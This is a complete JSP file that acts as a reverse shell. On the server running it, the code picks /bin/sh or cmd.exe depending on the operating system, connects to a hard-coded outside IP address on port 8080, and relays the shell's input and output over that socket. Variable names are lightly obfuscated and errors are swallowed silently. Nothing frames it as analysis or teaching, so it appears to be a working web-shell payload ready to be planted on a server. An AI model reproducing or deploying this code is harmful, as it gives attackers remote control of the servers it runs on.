<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream hO;
    OutputStream cM;

    StreamConnector( InputStream hO, OutputStream cM )
    {
      this.hO = hO;
      this.cM = cM;
    }

    public void run()
    {
      BufferedReader nB  = null;
      BufferedWriter tIX = null;
      try
      {
        nB  = new BufferedReader( new InputStreamReader( this.hO ) );
        tIX = new BufferedWriter( new OutputStreamWriter( this.cM ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = nB.read( buffer, 0, buffer.length ) ) > 0 )
        {
          tIX.write( buffer, 0, length );
          tIX.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( nB != null )
          nB.close();
        if( tIX != null )
          tIX.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "173.255.214.44", 8080 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
